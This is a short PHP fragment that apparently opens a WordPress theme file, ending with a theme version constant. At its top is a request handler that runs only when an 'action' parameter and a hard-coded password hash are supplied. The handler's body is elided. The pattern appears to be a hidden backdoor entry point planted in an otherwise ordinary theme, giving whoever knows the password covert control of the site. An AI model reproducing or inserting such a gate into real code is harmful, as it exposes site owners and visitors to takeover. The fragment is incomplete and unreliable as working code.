<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '53b274b07763f9c2543cee1ed1900c5c'))
	{
...
if (!defined('OSETIN_THEME_VERSION')) define('OSETIN_THEME_VERSION', '6.3.2');
